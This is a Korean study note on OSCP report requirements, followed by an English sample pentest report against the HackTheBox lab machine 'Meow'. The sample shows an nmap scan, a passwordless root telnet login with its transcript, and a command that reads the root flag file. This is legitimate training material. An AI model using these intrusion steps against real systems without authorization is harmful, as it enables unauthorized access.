### OSCP 보고서 필수 포함 내용 (Requirements)

OffSec 가이드라인과 템플릿에 따르면, 점수를 받기 위해 반드시 포함해야 하는 핵심 요소는 다음과 같습니다.

1. **재현 가능성 (Steps to Reproduce):**
* 가장 중요합니다. 제3자가 보고서를 보고 **"복사-붙여넣기"만으로 똑같이 해킹할 수 있어야** 합니다.
* 모호한 설명(예: "익스플로잇을 실행했다") 대신 **정확한 명령어와 단계**를 적어야 합니다.


2. **스크린샷 증빙 (Proof Screenshots):**
* 단순히 Flag 텍스트만 적으면 안 됩니다.
* `whoami` (내 권한), `ipconfig` 또는 `ip a` (타겟 IP 확인), `type proof.txt` (플래그 내용) 명령어를 **한 화면에** 실행한 스크린샷이 필수입니다.


3. **취약점 및 권고 사항 (Vulnerability & Recommendation):**
* 어떤 취약점이 발견되었는지(XSS, RCE 등)와 이를 막으려면 어떻게 해야 하는지(패치, 설정 변경 등)를 명시해야 합니다.

### [Example] English Penetration Test Report

동아리에서 바로 사용할 수 있도록, 가장 기초적인 **HTB 'Meow' (Telnet)** 머신을 예시로 작성한 영문 리포트입니다. 일단은 시험이 영문이다 보니 이렇게 작성했습니다만, 처음 시작할 때엔느 어떻게 머신을 뚫어야하는지부터가 시작이니 한글이 더 편하겠죠?

---

# OffSec Certified Professional Exam Report
**Target:** Meow (10.129.1.12) | **Student:** [Your Name]

## 1. High-Level Summary
### 1.1 Executive Summary
This report details the penetration test performed against the target system **Meow**. During the assessment, a critical vulnerability was identified in the **Telnet** service, which allowed unauthorized access. An attacker could remotely log in to the system with administrative privileges without a password, posing a severe risk to the confidentiality and integrity of the system.

### 1.2 Recommendations
* **Disable Telnet:** The Telnet protocol transmits data in cleartext and is inherently insecure. It is strongly recommended to disable the Telnet service immediately.
* **Enforce Authentication:** If remote access is necessary, use secure protocols like SSH (Secure Shell) and enforce strong password policies.

---

## 2. Methodologies
### 2.1 Information Gathering
To identify open ports and running services, an Nmap scan was performed against the target IP.

**Command:**
```bash
nmap -sC -sV 10.129.1.12
```

**Result:**
The scan results revealed that **Port 23 (Telnet)** is open.

* **Port 23/tcp:** Linux telnetd

### 2.2 Penetration (Initial Access)

#### 2.2.1 Vulnerability Explanation

The Telnet service on the target allows connections without a password for the `root` account. This is a misconfiguration that permits trivial unauthorized access.

#### 2.2.2 Steps to Reproduce

1. Initiate a Telnet connection to the target IP using the command line.
```bash
telnet 10.129.1.12
```


2. When prompted for a login name, enter `root`.
3. Access is granted immediately without a password prompt.

**Proof of Concept (PoC):**

```text
$ telnet 10.129.1.12
Trying 10.129.1.12...
Connected to 10.129.1.12.
Escape character is '^]'.

Meow login: root
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-77-generic x86_64)
...
root@Meow:~#

```

### 2.3 Post-Exploitation (Proof Files)

After gaining root access, the `flag.txt` file was located in the root directory.

#### 2.3.1 Root Flag

* **Path:** `/root/flag.txt`
* **Hash:** `b40abdfe2363...` (Example Hash)

**Screenshot Evidence:**
*[Insert Screenshot here showing: `whoami && ip a && cat /root/flag.txt`]*

```bash
root@Meow:~# whoami && ip a && cat /root/flag.txt
root
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 ...
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP ...
    inet 10.129.1.12/16 brd 10.129.255.255 scope global eth0...

HTB{m30w_m30w_pwn3d}

```